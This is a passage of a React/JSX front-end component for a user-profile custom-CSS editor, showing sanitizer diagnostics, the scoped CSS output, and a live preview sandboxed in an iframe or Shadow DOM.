                {/* Code Textarea with line numbers vibe */}
                <div className="relative rounded-xl border border-slate-700 overflow-hidden bg-slate-950 font-mono text-xs shadow-inner">
                  <textarea
                    rows={12}
                    value={profile.rawCss || ''}
                    onChange={(e) =>
                      setProfile((prev) => ({ ...prev, rawCss: e.target.value }))
                    }
                    placeholder="Enter custom CSS rules here (e.g. .profile-card { border: 2px dashed red; })"
                    spellCheck={false}
                    className="w-full p-3 bg-transparent text-emerald-400 placeholder:text-slate-600 focus:outline-none resize-y leading-relaxed font-mono"
                  />
                </div>

                {/* Transformed AST Scoped Output Accordion */}
                {showTransformedCss && (
                  <div className="p-3 rounded-xl border border-slate-700/80 bg-slate-900/90 space-y-2">
                    <p className="text-xs font-bold text-slate-300 flex items-center justify-between">
                      <span>Transformed & Scoped Output:</span>
                      <span className="font-mono text-[10px] text-emerald-400">
                        {cssAudit.stats.scopedRuleCount} rules scoped
                      </span>
                    </p>
                    <pre className="p-2.5 rounded bg-black/60 text-[11px] font-mono text-slate-300 overflow-x-auto whitespace-pre-wrap max-h-36">
                      {cssAudit.sanitizedCss || '/* Empty CSS */'}
                    </pre>
                  </div>
                )}

                {/* Real-time AST Sanitization Diagnostics Panel */}
                <div className="p-3.5 rounded-xl border border-slate-700/80 bg-slate-800/70 space-y-3">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      {cssAudit.violations.some((v) => v.severity === 'critical') ? (
                        <ShieldAlert className="w-4 h-4 text-red-400" />
                      ) : (
                        <ShieldCheck className="w-4 h-4 text-emerald-400" />
                      )}
                      <span className="text-xs font-bold text-slate-200">
                        CSS AST Sanitizer Pipeline
                      </span>
                    </div>

                    <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-900 text-slate-400">
                      Rules: {cssAudit.stats.ruleCount} | Scoped: {cssAudit.stats.scopedRuleCount} | Stripped: {cssAudit.stats.strippedRuleCount}
                    </span>
                  </div>

                  {/* Violations / Audit Messages List */}
                  {cssAudit.violations.length === 0 ? (
                    <div className="flex items-center gap-2 text-xs text-emerald-400 bg-emerald-500/10 p-2.5 rounded-lg border border-emerald-500/20">
                      <Check className="w-3.5 h-3.5" />
                      <span>AST Clean: No malicious rules or unapproved directives detected.</span>
                    </div>
                  ) : (
                    <div className="space-y-1.5 max-h-40 overflow-y-auto pr-1">
                      {cssAudit.violations.map((violation, i) => (
                        <div
                          key={i}
                          className={`p-2 rounded text-[11px] flex items-start gap-2 border ${
                            violation.severity === 'critical'
                              ? 'bg-red-500/10 border-red-500/30 text-red-300'
                              : violation.severity === 'warning'
                              ? 'bg-amber-500/10 border-amber-500/30 text-amber-300'
                              : 'bg-blue-500/10 border-blue-500/30 text-blue-300'
                          }`}
                        >
                          <AlertTriangle className="w-3.5 h-3.5 flex-shrink-0 mt-0.5" />
                          <div className="flex-1 min-w-0">
                            <p className="font-semibold">{violation.message}</p>
                            {violation.originalSnippet && (
                              <code className="block mt-0.5 text-[10px] font-mono opacity-80 truncate">
                                {violation.originalSnippet}
                              </code>
                            )}
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        </div>

        {/* RIGHT PANE: Live Sandboxed Profile Preview (Width: 58%) */}
        <div className="w-full md:w-[55%] lg:w-[58%] flex flex-col bg-slate-950 p-3 sm:p-4 overflow-hidden">
          {sandboxMode === 'iframe' ? (
            <SandboxedFrame
              profile={profile}
              sanitizedCss={cssAudit.sanitizedCss}
              viewport={viewport}
              onViewportChange={setViewport}
            />
          ) : (
            <div className="flex-1 flex flex-col h-full bg-slate-950 border border-slate-800 rounded-xl overflow-hidden shadow-2xl p-4">
              <div className="flex items-center justify-between pb-3 mb-3 border-b border-slate-800 text-xs">
                <div className="flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4 text-emerald-400" />
                  <span className="font-bold text-slate-200">Shadow DOM Root Sandbox</span>
                  <span className="text-[10px] px-2 py-0.5 rounded bg-purple-500/20 text-purple-300 font-mono">
                    contain: content;
                  </span>
                </div>
              </div>
              <div className="flex-1 overflow-auto">
                <ShadowDomSandbox
                  profile={profile}
                  sanitizedCss={cssAudit.sanitizedCss}
                />
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
